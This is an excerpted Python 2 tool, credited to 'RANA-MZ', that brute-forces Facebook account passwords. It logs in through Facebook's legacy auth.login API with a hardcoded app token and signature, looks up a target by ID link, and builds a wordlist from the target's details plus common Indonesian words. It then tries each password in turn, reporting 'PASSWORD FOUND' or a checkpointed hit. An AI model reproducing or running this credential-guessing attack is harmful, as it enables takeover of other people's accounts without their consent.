...
def banner():
	os.system("clear")
        runn('''\033[1;31mo--o    O  o   o   O      o   o o---o 
\033[1;32m|   |  / \ |\  |  / \     |\ /|    /  
...
def login():
	...
	try:
	    ...
	    token = open("login.txt", "r").read()
            ...
            banner()
            print
            print h+" ["+a+"__"+h+"]"+p+" Login With FB"
            print d+35*"+"
	    username = raw_input(p+" ["+m+"__"+p+"]"+a+" Username"+d+" : ")                            
            password = raw_input(m+" ["+p+"__"+m+"]"+a+" Password"+d+" : ")
	    urlranamz = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+username+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	    ranamz = urlranamz.content
	    jsl = json.loads(ranamz)

	    if "session_key" in ranamz:
		print 
		runn(h+" COMPLETE LOGIN.........")
                time.sleep(0.5)
...
def pengguna():
    ...
    try:
        ...
        print " There's a problem \n maybe your account got session"
        os.system("rm -f login.txt")

    else:

        ranamz = requests.get("https://graph.facebook.com/me?access_token=" + token)
        ID1 = json.loads(ranamz.text)
        nama = ID1["name"]
        print k+" ["+p+"___"+k+"]"+h+" ACTIV TOKEN!   "+p+nama
        print d+35*"+"
...
def brute_fast():
	...
	try:
	    ...
	    print m+" \n eror 403.. "
            print "  Please create a new fb account and login to this tool again.!."
	    os.system("rm -f login.txt")
		...
		with open("wordlist.txt", "r") as san_ranamz:

                  for pas in san_ranamz:
                    pas = pas.replace("\n", "")
                    print " "+h+"["+p+"ranaMZ"+h+"]"+p+" ____"+a+"__> " +d+ pas

                    ranamz_ID = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ranamz = json.loads(ranamz_ID.text)
                    if "access_token" in ranamz:
                        print "\n \n"
                        runn(a+"          SUCCESS...")
                        print
                        print a+" ["+p+"iD iZ OK"+a+"]"+h+" NAME FACEBOOK  : "+p+ nam
                        print a+" ["+p+"iD iZ OK"+a+"]"+h+" USERNAME  : "+p+ email
                        print a+" ["+p+"iD iZ OK"+a+"]"+h+" PASSWORD FOUND : "+p+ pas
			print " "
                        sys.exit()

                    elif "www.facebook.com" in ranamz["error_msg"]:
                        print "\n \n"
                        runn(a+"          SUCCESS BUTT CP...")
                        print
                        print a+" ["+k+"iD iZ CP"+a+"]"+h+" NAME FACEBOOK  : "+k+ nam
                        print a+" ["+k+"iD iZ CP"+a+"]"+h+" USERNAME  : "+k+ email
                        print a+" ["+k+"iD iZ CP"+a+"]"+h+" PASSWORD FOUND : "+k+ pas
			print " "
                        sys.exit()
	      ...
	      os.system("rm -f login.txt")
              ...
              print
              print m+"PROBLIM FOUND \n ENTER CORRECT ID LNK.. \n\n"
	  ...
	  dataku = open("wordlist.txt", "r")
          th = multiprocessing.Process(target=brut, args=(dataku,))
          th.start()
          th.join()

        print " \n "
        print m+"    CODED BY RANA-MZ \n "
...
def target():
	...
	print
        pengguna()
        target = raw_input(a+" ["+h+"?"+a+"]"+p+" iD Link "+k+": ")
...
def wordlist():
	...
	try:
	    ...
	    os.system('rm -f login.txt')
                ...
                banner()
		target()
		urlranamz = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
	        js = json.loads(urlranamz.text)
...
######
		...
		file.write(pas1+b +pas2+b +pas3+b +pas4+b +pas109+b +pas110+b +pas7+b +pas8+b +pas9+b +pas10+b)
                file.write(pas01+b +pas02+b +pas03+b +"bangsat"+b +"anjing"+b +"sayang"+b +"sayang123"+b +"bismillah"+b)
                file.write("kontol"+b +"kontol123"+b + "bajingan"+b +"jembut"+b)
                file.write(pas5+b +pas6+b)
